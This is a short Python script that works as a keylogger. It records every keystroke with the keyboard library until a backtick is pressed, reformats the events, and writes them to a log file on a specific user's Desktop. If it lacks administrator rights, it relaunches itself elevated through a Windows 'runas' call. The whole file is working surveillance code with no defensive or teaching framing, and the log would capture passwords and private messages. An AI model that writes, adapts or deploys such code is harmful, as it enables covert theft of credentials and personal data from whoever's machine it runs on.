from keyboard import record
import ctypes #Funny C in Py
from sys import executable, argv
from os.path import join

output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
c = (ctypes.windll.shell32)

def start():
    r = record(until='`')
    r = str(r)
    r = r.replace(',', '')
    r = r.replace("KeyboardEvent(", '')
    r = r.replace("down)", ',')
    r = r.replace("up)", '\'')
    output.write(r)

if __name__ == "__main__":
    if not c.IsUserAnAdmin():
        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
    start()